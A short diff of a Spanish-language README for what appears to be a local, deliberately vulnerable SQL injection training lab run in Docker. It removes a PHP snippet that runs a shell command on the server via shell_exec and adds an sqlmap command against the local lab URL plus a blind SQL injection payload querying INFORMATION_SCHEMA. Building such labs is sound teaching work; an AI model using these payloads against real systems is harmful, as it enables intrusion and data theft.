@@ -10,18 +10,12 @@ docker run --publish 8080:80 -v ./SQLInjection:/app ghcr.io/ingenieroricardo/sql
 
 <hr>
 
-Al no tener validaciones se pueden enviar PHP que se pueden ejecutar como estos:
+Al tener las variables concatenadas puedes hacer inyeccion SQL:
 
-```php
-<?php
-  $salida = shell_exec("cd .. && ls");
-  echo "<pre>$salida</pre>";
-?>
+```bash
+sqlmap -u "http://127.0.0.1:8080/servidor.php?nombre=yo&mensaje=hola" -b
 ```
-Con este codigo podemos conocer los archivos en el servidor
 
-
-```php
+```bash
 hola' RLIKE (SELECT IF(COUNT(DISTINCT(table_schema))=1, 'hola', 0x28) FROM INFORMATION_SCHEMA.TABLES) AND 'TMTd'='TMTd
 ```
-Con este codigo podemos ver codigo fuente
